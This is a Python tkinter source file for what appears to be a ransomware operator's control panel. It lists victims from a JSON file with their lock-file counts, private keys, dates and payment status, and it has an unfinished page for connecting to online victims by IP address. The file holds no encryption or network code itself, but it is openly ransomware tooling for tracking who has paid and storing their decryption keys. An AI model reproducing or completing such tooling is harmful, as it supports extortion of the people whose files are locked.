import tkinter as tk
from tkinter import ttk
import pyautogui
import os
import json

def styles():
    style = ttk.Style()
    
    style.configure("Himg.TLabel",
                    background="#FA0000")
    
    style.configure("TB.TLabel",
                    foreground="#FFFFFF",
                    background="#910000",
                    font=("Comic Sans MS", 20))
    
    style.configure("O.TLabel",
                    foreground="#FFFFFF",
                    background="#282626",
                    font=("Comic Sans MS", 20))
    
    style.configure("b.TButton",
                    foreground="#000000",
                    background="#FFFFFF",
                    font=("Comic Sans MS", 16))
    
    style.configure("Treeview",
                    width=800)

def windowInit():
    global root
    root = tk.Tk()
    root.title("Server")
    root.iconbitmap("./images/lock.ico")
    root.configure(bg="#282626")
    width, height, x, y = 900, 400, pyautogui.size().width // 2, pyautogui.size().height // 2
    root.geometry(f"{width}x{height}+{x-width//2}+{y-height//2}")
    root.resizable(False, False)

    menuBar()
    victimListPage()

def menuBar():
    menu = tk.Menu(root)
    menu.add_cascade(label="VictimList",command=victimListPage)
    menu.add_cascade(label="Connect",command=connectPage)
    root.config(menu=menu)

def clearWindow():
    for widget in root.winfo_children():
        widget.destroy()
    menuBar()

def victimListPage():
    def treeview():
        def dataRefresh():
            testPath,rmfolderPath = "./data/victimlist.json",f"C:/Users/{os.getlogin()}/AppData/Local/bkms/victimlist.json"
            for item in tree.get_children():
                tree.delete(item)

            with open(testPath) as file:
                data = json.load(file)
            for item in data:
                print(item)
                if(item["paid"] == True):
                    tree.insert("", tk.END, values=(item["UID"], item["fileNumber"], item["privateKey"], item["date"],item["paid"]),tags=("paid_true"))
                else:
                    tree.insert("", tk.END, values=(item["UID"], item["fileNumber"], item["privateKey"], item["date"],item["paid"]),tags=("paid_false"))
            l.config(text=f"Total = {len(data)}")
            tree.after(5000,dataRefresh)
        ttk.Label(root,text="Victim List:",style="O.TLabel").pack(anchor="w",padx=25)
        tree = ttk.Treeview(root,columns=("UID","fileNumber","privateKey","date","paid"),show="headings",style="Treeview")
        tree.heading("UID",text="UID")
        tree.heading("fileNumber",text="Lock file number")
        tree.heading("privateKey",text="Private key")
        tree.heading("date",text="Date")
        tree.heading("paid",text="Paid")

        tree.column("UID", width=250, anchor=tk.CENTER)
        tree.column("fileNumber", width=100, anchor=tk.CENTER)
        tree.column("privateKey", width=250, anchor=tk.CENTER)
        tree.column("date", width=200, anchor=tk.CENTER)
        tree.column("paid",width=50, anchor=tk.CENTER)

        tree.tag_configure('paid_true', background='#27FD59')
        tree.tag_configure('paid_false', background='#FF2C33')

        tree.pack()
        l = ttk.Label(root,text="Total:",style="O.TLabel")
        l.pack(anchor="w",padx=25)
        dataRefresh()
        
    clearWindow()
    treeview()
    b = ttk.Button(root,text="Send",style="b.TButton")
    b.pack(anchor="e",padx=25)

def A():
    print("A")

def connectPage():
    def online():
        ttk.Label(root,text="Online List:",style="O.TLabel").pack(anchor="w",padx=25)
        frame = tk.Frame(root,background="#282626")
        frame.pack(anchor="w",padx=25)
        tree = ttk.Treeview(frame,columns=("UID","IP"),show="headings",style="Treeview")
        tree.heading("UID",text="UID")
        tree.heading("IP",text="IP Address")
        tree.column("UID", width=250, anchor=tk.CENTER)
        tree.column("IP",width=200, anchor=tk.CENTER)
        tree.pack(side='left',padx=(0,25))

        rf = tk.Frame(frame,background="#282626")
        rf.pack(side="right",padx=25)
        e = ttk.Entry(rf,font=("Comic Sans MS", 20)).pack(pady=10)
        ttk.Button(rf,text="Connect",style="b.TButton",command=A).pack(anchor="e")
    clearWindow()
    online()

def run():
    windowInit()
    styles()
    root.mainloop()

if __name__ == "__main__":
    run()